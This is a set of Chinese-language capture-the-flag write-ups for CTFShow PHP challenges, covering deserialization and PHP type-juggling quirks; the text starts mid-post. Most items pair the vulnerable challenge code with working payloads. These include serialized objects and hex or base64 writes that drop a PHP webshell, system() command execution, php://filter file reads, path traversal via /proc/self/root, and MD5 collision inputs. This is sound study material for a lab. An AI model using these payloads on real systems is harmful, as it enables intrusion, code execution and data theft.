if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){ $user = unserialize($_COOKIE['user']); } $user-&gt;login($username,$password); } web259$vip = unserialize($_GET['vip']); //vip can get flag one key $vip-&gt;getFlag(); 一般反序列化的题目，那个php页面没用任何已有的类，那大概率就是考察PHP原生类的反序列化。 web260if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){ echo $flag; } ?ctfshow=ctfshow_i_love_36D ?ctfshow=s:18:\"ctfshow_i_love_36D\" ？？？？？ &lt;?php class ctfshow{ public $a='ctfshow_i_love_36D'; } echo serialize(new ctfshow()); ?&gt; ?ctfshow=O:7:\"ctfshow\":1:{s:1:\"a\";s:18:\"ctfshow_i_love_36D\";} web261class ctfshowvip{ public $username; public $password; public $code; public function __construct($u,$p){ $this-&gt;username=$u; $this-&gt;password=$p; } public function __wakeup(){ if($this-&gt;username!='' || $this-&gt;password!=''){ die('error'); } } public function __invoke(){ eval($this-&gt;code); } public function __sleep(){ $this-&gt;username=''; $this-&gt;password=''; } public function __unserialize($data){ $this-&gt;username=$data['username']; $this-&gt;password=$data['password']; $this-&gt;code = $this-&gt;username.$this-&gt;password; } public function __destruct(){ if($this-&gt;code==0x36d){ file_put_contents($this-&gt;username, $this-&gt;password); } } } unserialize($_GET['vip']); 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 当反序列化时会进入__unserialize中 而且也没有什么方法可以进入到__invoke中，所以无法利用危险函数eval 所以直接就朝着写文件搞就可以了。 &lt;?php class ctfshowvip{ public $username; public $password; public function __construct($u,$p){ $this-&gt;username=$u; $this-&gt;password=$p; } } $a=new ctfshowvip('877.php','&lt;?php eval($_POST[1]);?&gt;'); echo serialize($a); O:10:\"ctfshowvip\":2:{s:8:\"username\";s:7:\"877.php\";s:8:\"password\";s:24:\"&lt;?php eval($_POST[1]);?&gt;\";} ?vip=O:10:\"ctfshowvip\":2:{s:8:\"username\";s:7:\"877.php\";s:8:\"password\";s:24:\"&lt;?php eval($_POST[1]);?&gt;\";} 访问877.php，并post传入：1=phpinfo(); 成功rce 1=system(\"ls /\"); 1=system(\"cat /flag_is_here\"); web262index.php class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; } } $f = $_GET['f']; $m = $_GET['m']; $t = $_GET['t']; if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){ $msg = new message($f,$m,$t); $umsg = str_replace('fuck', 'loveU', serialize($msg)); setcookie('msg',base64_encode($umsg)); echo 'Your message has been sent'; } message.php class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; } } if(isset($_COOKIE['msg'])){ $msg = unserialize(base64_decode($_COOKIE['msg'])); if($msg-&gt;token=='admin'){ echo $flag; } } payload class message{ public $token='admin'; } $msg = new message; echo base64_encode(serialize($msg)); Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9 web263ini_set('session.serialize_handler', 'php'); 其中session.serialize_handler是用来设置session的序列话引擎 不同的引擎所对应的session的存储方式不相同 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 session 的目录在 /var/lib/php/sessions 中，如果我们执行下面的代码 &lt;?php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['name'] = 'spoock'; var_dump($_SESSION); 在 php_serialize 引擎下，会生成一个session文件，session文件中存储的数据为: a:1:{s:4:\"name\";s:6:\"spoock\";} php 引擎下文件内容为: name|s:6:\"spoock\"; php_binary 引擎下文件内容为: names:6:\"spoock\"; web264class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; } } $f = $_GET['f']; $m = $_GET['m']; $t = $_GET['t']; if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){ $msg = new message($f,$m,$t); $umsg = str_replace('fuck', 'loveU', serialize($msg)); $_SESSION['msg']=base64_encode($umsg); echo 'Your message has been sent'; } highlight_file(__FILE__);","categories":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/categories/CTFShow/"}],"tags":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/tags/CTFShow/"},{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CTFShow-PHP特性","slug":"PHP特性","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:09:31.440Z","comments":true,"path":"/post/PHP特性.html","link":"","permalink":"http://example.com/post/PHP%E7%89%B9%E6%80%A7.html","excerpt":"","text":"PHP特性web89利用数组进行绕过 include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match(\"/[0-9]/\", $num)){ die(\"no no no!\"); } if(intval($num)){ echo $flag; } } intval函数 如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0 通过preg_match对num进行正则匹配，如果num是一个数，就会返回no no no ?num[]=1 web90include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"4476\"){ die(\"no no no!\"); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } } int intval ( mixed $var [, int $base = 10 ] ) 参数说明： $var：要转换成 integer 的数量值。 $base：转化所使用的进制。 intval($num,0)： 如果 base 是 0，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 “0” 开始，使用 8 进制(octal)；否则， 将使用 10 进制 (decimal)。 intval('4476.0')===4476 小数点 intval('+4476.0')===4476 正负号 intval('4476e0')===4476 科学计数法 intval('0x117c')===4476 16进制 intval('010574')===4476 8进制 intval(' 010574')===4476 8进制+空格 因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num=4476%23 会转整形，从左向右看数字留下，字符就过 web91正则表达式是匹配方法 https://blog.csdn.net/qq_46091464/article/details/108278486 可以通过 %0a 绕过 payload： abc%0aphp preg_match() 正则表达式中$ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 $。 所以如果设置RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符（也就是%0a) i 不区分(ignore)大小写 m 多(more)行匹配 若存在换行\\n并且有开始^或结束$符的情况下， 将以换行为分隔符，逐行进行匹配 $str = \"abc\\nabc\"; $preg = \"/^abc$/m\"; preg_match($preg, $str,$matchs); 这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。 s 特殊字符圆点 . 中包含换行符 默认的圆点 . 是匹配除换行符 \\n 之外的任何单字符，加上s之后, .包含换行符 $str = \"abggab\\nacbs\"; $preg = \"/b./s\"; preg_match_all($preg, $str,$matchs); 这样匹配到的有三个 bg b\\n bs A 强制从目标字符串开头匹配; D 如果使用$限制结尾字符,则不允许结尾有换行; e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; ?cmd=111%0aphp %0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。 经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag web92include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num==4476){ die(\"no no no!\"); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 intval('4476.0')===4476 小数点 intval('+4476.0')===4476 正负号 intval('4476e0')===4476 科学计数法 intval('0x117c')===4476 16进制 intval('010574')===4476 8进制 intval(' 010574')===4476 8进制+空格 ==4476是若等于用4476%23就会直接nonono web93include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num==4476){ die(\"no no no!\"); } if(preg_match(\"/[a-z]/i\", $num)){ die(\"no no no!\"); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } intval('010574')===4476 8进制 web94include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"4476\"){ die(\"no no no!\"); } if(preg_match(\"/[a-z]/i\", $num)){ die(\"no no no!\"); } if(!strpos($num, \"0\")){ die(\"no no no!\"); } if(intval($num,0)===4476){ echo $flag; } } ?num=4476.0 web95include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num==4476){ die(\"no no no!\"); } if(preg_match(\"/[a-z]|\\./i\", $num)){ die(\"no no no!!\"); } if(!strpos($num, \"0\")){ die(\"no no no!!!\"); } if(intval($num,0)===4476){ echo $flag; } } 可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574 %2b010574在GET获取之前就decode了，就完全等价于+010574，GET获取的就是+ web96highlight_file(__FILE__); if(isset($_GET['u'])){ if($_GET['u']=='flag.php'){ die(\"no no no\"); }else{ highlight_file($_GET['u']); } } highlight_file(filename,return) filename 必需。要进行高亮处理的 PHP 文件的路径。 return 可选。如果设置 true，则本函数返回高亮处理的代码。 /?u=/var/www/html/flag.php 绝对路径 /?u=./flag.php 相对路径 /?u=php://filter/resource=flag.php php伪协议 web97MD5函数无法处理数组 MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。md5弱类型比较可以直接数组绕过，其结果都会转换为null，MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。 POST: a[]=1&amp;b[]=2 如果进行了string强制转类型后，则不再接受数组 弱碰撞： $a=(string)$a; $b=(string)$b; if( ($a!==$b) &amp;&amp; (md5($a)==md5($b)) ){ echo $flag; } md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。 payload: a=QNKCDZO&amp;b=240610708 强碰撞： $a=(string)$a; $b=(string)$b; if( ($a!==$b) &amp;&amp; (md5($a)===md5($b)) ){ echo $flag; } 这时候需要找到两个真正的md5值相同数据 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 web98include(\"flag.php\"); $_GET?$_GET=&amp;$_POST:'flag'; $_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag'; $_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag'; highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); ?&gt; 发送一个GET请求，POST的值赋给GET，要是不发送GET的值为flag（GET和POST其实都是数组，COOKIE和SERVER也是），通过POST发送HTTP_SERVER的值flag web99highlight_file(__FILE__); $allow = array();//设置为数组 for ($i=36; $i &lt; 0x36d; $i++) { array_push($allow, rand(1,$i));//向数组里面插入随机数 } if(isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)){ file_put_contents($_GET['n'], $_POST['content']); } ?&gt; rand() 函数返回随机整数。 isset() 函数用于检测变量是否已设置并且非 NULL。 array_push() 向数组里面插入随机数 in_array() in_array延用了php中的== in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1 file_put_contents()把一个字符串写入文件中。 如果文件不存在，将创建一个文件 如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。 ?n=1.php content=&lt;?php eval($_POST[1]);?&gt; web100highlight_file(__FILE__); include(\"ctfshow.php\"); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET['v1']; $v2=$_GET['v2']; $v3=$_GET['v3']; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(\"/\\;/\", $v2)){ if(preg_match(\"/\\;/\", $v3)){ eval(\"$v2('ctfshow')$v3\"); } } } ?&gt; 运算符优先级，所以保证v1为数字就可以了 反射类 ReflectionClass 类 ReflectionClass 类报告了一个类的有关信息。 最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass('ctfshow'); payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; &lt;?php class A{ public static $flag=\"flag{123123123}\"; const PI=3.14; static function hello(){ echo \"hello&lt;/br&gt;\"; } } $a=new ReflectionClass('A'); var_dump($a-&gt;getConstants()); 获取一组常量 输出 array(1) { [\"PI\"]=&gt; float(3.14) } var_dump($a-&gt;getName()); 获取类名 输出 string(1) \"A\" var_dump($a-&gt;getStaticProperties()); 获取静态属性 输出 array(1) { [\"flag\"]=&gt; string(15) \"flag{123123123}\" } var_dump($a-&gt;getMethods()); 获取类中的方法 输出 array(1) { [0]=&gt; object(ReflectionMethod)#2 (2) { [\"name\"]=&gt; string(5) \"hello\" [\"class\"]=&gt; string(1) \"A\" } } 其他payload 直接输出$ctfshow;构造出 var_dump($ctfshow); payload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/; 直接输出$ctfshow;构造出 var_dump($ctfshow); payload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/; /?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tac ctfshow.php`; 或者拼接 /?v1=1&amp;v2=new%20Exception&amp;v3=;system(%27cat%20ctfshow.php%27); flag_is_124446aa0x2d2cf30x2d40e90x2dbe290x2d507c45cfa0fe\"] 0x2d转换为- ctfshow{124446aa-2cf3-40e9-be29-507c45cfa0fe} web101highlight_file(__FILE__); include(\"ctfshow.php\"); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET['v1']; $v2=$_GET['v2']; $v3=$_GET['v3']; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){ eval(\"$v2('ctfshow')$v3\"); } } } ?&gt; 必须使用反射类 ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; flag_f7c086750x2d57210x2d415b0x2dbc460x2de0a24c97b36 ctfshow{f7c08675-5721-415b-bc46-e0a24c97b36}最后一段是11位但是应该是12位所以爆破 web102highlight_file(__FILE__); $v1 = $_POST['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; $v4 = is_numeric($v2) and is_numeric($v3); if($v4){ $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str); } else{ die('hacker'); } ?&gt; substr(string,start,length) string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。 正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始 0 - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。 正数 - 从 start 参数所在的位置返回的长度 负数 - 从字符串末端返回的长度 call_user_func 回调函数 PHP中所讲的回调函数，其实就是指调用函数时不是向函数中传递标准的变量作为参数，而是将另一个函数作为参数，传递到调用的函数中，回调函数也就是这个作为参数的函数。 $str = call_user_func($v1,$s);就是将s作为v1函数的参数 hex2bin 把十六进制值转换为 ASCII 字符： &lt;?php echo hex2bin(\"48656c6c6f20576f726c6421\"); ?&gt; 以上实例输出结果: Hello World! payload v2必须是数字 is_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的。 var_dump(is_numeric(\"0x66\")); php5的环境下返回true php7返回false 之后经过截断我们就得到了16进制，而且是不带0x的，这时候就可以通过调用函数hex2bin将16进制转换成字符串从而写入木马文件。（hex2bin如果参数带0x会报错） &lt;?php eval($_POST[1]);?&gt; 0x3c3f706870206576616c28245f504f53545b315d293b3f3e get:v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php post:v1=hex2bin 但是本地环境是php7，v2必须是数字，所以使用php伪协议用base64编码，再bin2hex， 利用base64，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊： 直接参考payload $a='&lt;?=`cat *`;'; $b=base64_encode($a); // PD89YGNhdCAqYDs= $c=bin2hex($b); //这里直接用去掉=的base64 输出 5044383959474e6864434171594473 ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin 带e的话会被认为是科学计数法，可以通过is_numeric检测。 大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。 web103highlight_file(__FILE__); $v1 = $_POST['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; $v4 = is_numeric($v2) and is_numeric($v3); if($v4){ $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){ file_put_contents($v3,$str); } else{ die('Sorry'); } } else{ die('hacker'); } ?&gt; 同上题 ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin web104sha1与md5类似。都无法处理数组 highlight_file(__FILE__); include(\"flag.php\"); if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_POST['v1']; $v2 = $_GET['v2']; if(sha1($v1)==sha1($v2)){ echo $flag; } } ?&gt; 1.可以直接v1=v2 2.使用sha1漏洞，sha1函数处理不了数组，均将为false 3.用科学计数法 v1=aaK1STfY //0e76658526655756207688271159624026011393 v2=aaO8zKZF //0e89257456677279068558073954252716165668 web105highlight_file(__FILE__); include('flag.php'); error_reporting(0); $error='你还想要flag嘛？'; $suces='既然你想要那给你吧！'; foreach($_GET as $key =&gt; $value){ if($key==='error'){ die(\"what are you doing?!\"); } $$key=$$value; }foreach($_POST as $key =&gt; $value){ if($value==='flag'){ die(\"what are you doing?!\"); } $$key=$$value; } if(!($_POST['flag']==$flag)){ die($error); } echo \"your are good\".$flag.\"\\n\"; die($suces); ?&gt; die() 函数 die() 函数输出一条消息，并退出当前脚本。 该函数是 exit() 函数的别名。 GET /?suces=flag POST flag=123&amp;error=suces foreach($_GET as $key =&gt; $value) $key=suces $value=flag $$key=$$value $suces=$flag//变量覆盖 foreach($_POST as $key =&gt; $value) $key=flag $value=123 =&gt; $flag=$123=&gt;$123为空，flag为空 $key=error $value=suces=&gt; $error=$suces=&gt;现在真正的flag 再error里 $_POST['flag']==$flag =&gt; 123==null 执行die($error)，输出flag GET /?suces=flag&amp;flag=123 POST error=suces 同理 web106highlight_file(__FILE__); include(\"flag.php\"); if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_POST['v1']; $v2 = $_GET['v2']; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){ echo $flag; } } ?&gt; 1.数组 POST v1[]=1 GET v2[]=2 2.用科学计数法 v1=aaK1STfY //0e76658526655756207688271159624026011393 v2=aaO8zKZF //0e89257456677279068558073954252716165668 web107highlight_file(__FILE__); error_reporting(0); include(\"flag.php\"); if(isset($_POST['v1'])){ $v1 = $_POST['v1']; $v3 = $_GET['v3']; parse_str($v1,$v2); if($v2['flag']==md5($v3)){ echo $flag; } } ?&gt; parse_str() 函数把查询字符串解析到变量中。将字符串解析成多个变量 parse_str ( string $encoded_string [, array &amp;$result ] ) : void 如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。 &lt;?php parse_str(\"name=Peter&amp;age=43\",$myArray); print_r($myArray); ?&gt; 运行结果 Array ( [name] =&gt; Peter [age] =&gt; 43 ) $a='q=123&amp;p=456'; parse_str($a,$b); echo $b['q']; //输出123 echo $b['p']; //输出456 payload v1=flag=c4ca4238a0b923820dcc509a6f75849b 即1的md5值 v3=1 web108ereg %00正则截断 highlight_file(__FILE__); error_reporting(0); include(\"flag.php\"); if (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE) { die('error'); } //只有36d的人才能看到flag if(intval(strrev($_GET['c']))==0x36d){ echo $flag; } ?&gt; ereg()、eregi()，正则函数，可以使用preg_match()来替代 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 strrev()反转字符串 &lt;?php echo strrev(\"I love Shanghai!\"); ?&gt; !iahgnahS evol I payload:c=a%00778 首先正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测，后面通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。 web109highlight_file(__FILE__); error_reporting(0); if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){ eval(\"echo new $v1($v2());\"); } } ?&gt; Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类 通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果 ReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射 ?v1=Exception&amp;v2=system(\"tac f*\") ?v1=ReflectionClass&amp;v2=system(\"tac f*\") ?v1=ReflectionMethod&amp;v2=system('tac f*') web110highlight_file(__FILE__); error_reporting(0); if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){ die(\"error v1\"); } if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){ die(\"error v2\"); } eval(\"echo new $v1($v2());\"); } ?&gt; php内置类 利用FilesystemIterator 获取指定目录下的所有文件 getcwd()函数 获取当前工作目录 返回当前工作目录 payload: ?v1=FilesystemIterator&amp;v2=getcwd web111highlight_file(__FILE__); error_reporting(0); include(\"flag.php\"); function getFlag(&amp;$v1,&amp;$v2){ eval(\"$$v1 = &amp;$$v2;\"); var_dump($$v1); } if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v1)){ die(\"error v1\"); } if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v2)){ die(\"error v2\"); } if(preg_match('/ctfshow/', $v1)){ getFlag($v1,$v2); } } ?&gt; v1的值必是ctfshow eval(\"$$v1 = &amp;$$v2;\");//将v2的值赋给v1 $GLOBALS — 引用全局作用域中可用的全部变量 payload： ?v1=ctfshow&amp;v2=GLOBALS //把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出. web112highlight_file(__FILE__); error_reporting(0); function filter($file){ if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){ die(\"hacker!\"); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } is_file — 判断给定文件名是否为一个正常的文件 is_file ( string $filename ) : bool 要获取flag需要满足两个条件，不能让is_file检测是文件，并且highlight_file可以识别为文件，这时候可以利用php伪协议。 可以直接用不带任何过滤器的filter伪协议 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 ?file=php://filter/resource=flag.php ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php ?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php//可打印字符引用编码 ?file=compress.zlib://flag.php //压缩 web113highlight_file(__FILE__); error_reporting(0); function filter($file){ if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){ die('hacker!'); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } 在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入 ls /proc/self/root，其实显示的内容是根目录下的内容，多次重复后绕过is_file. 在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含 ?file=compress.zlib://flag.php //压缩 ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php web114error_reporting(0); highlight_file(__FILE__); function filter($file){ if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){ die('hacker!'); }else{ return $file; } } $file=$_GET['file']; echo \"师傅们居然tql都是非预期 哼！\"; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } 师傅们居然tql都是非预期 哼！ ?file=php://filter/resource=flag.php web115include('flag.php'); highlight_file(__FILE__); error_reporting(0); function filter($num){ $num=str_replace(\"0x\",\"1\",$num); $num=str_replace(\"0\",\"1\",$num); $num=str_replace(\".\",\"1\",$num); $num=str_replace(\"e\",\"1\",$num); $num=str_replace(\"+\",\"1\",$num); return $num; } $num=$_GET['num']; if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){ if($num=='36'){ echo $flag; }else{ echo \"hacker!!\"; } }else{ echo \"hacker!!!\"; } hacker!!! is_numeric() 函数用于检测变量是否为数字或数字字符串。 num不能是36 trim(string,charlist) string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果省略该参数，则移除 测试 for ($i=0; $i &lt;=128 ; $i++) { $x=chr($i).'1'; if(trim($x)!=='1' &amp;&amp; is_numeric($x)){ echo urlencode(chr($i)).\"\\n\"; } } 输出 %0C(空格)、%2B（+号）、-、.（点）、0、1、2、3、4、5、6、7、8、9 + . 被过滤 -号不能用（-36） 发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。 payload:num=%0c36 web123error_reporting(0); highlight_file(__FILE__); include(\"flag.php\"); $a=$_SERVER['argv']; $c=$_POST['fun']; if(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&amp;&amp;$c&lt;=18){ eval(\"$c\".\";\"); if($fl0g===\"flag_give_me\"){ echo $flag; } } } ?&gt; $_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。 'argv' 传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。 即$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]=（get传参？后面的值） 例如： ?$fl0g=flag_give_me; //get $_SERVER[‘argv’][0]=$_SERVER[‘QUERY_STRING’]=\"$fl0g=flag_give_me;\" PHP变量命名规则： 只能包含：字母、数字、下划线，其中，只能以字母、下划线开头 同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_ 特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了 如 CTF[SHOW.COM=&gt;CTF_SHOW.COM payload1: CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag payload2: ?$fl0g=flag_give_me; #GET CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) 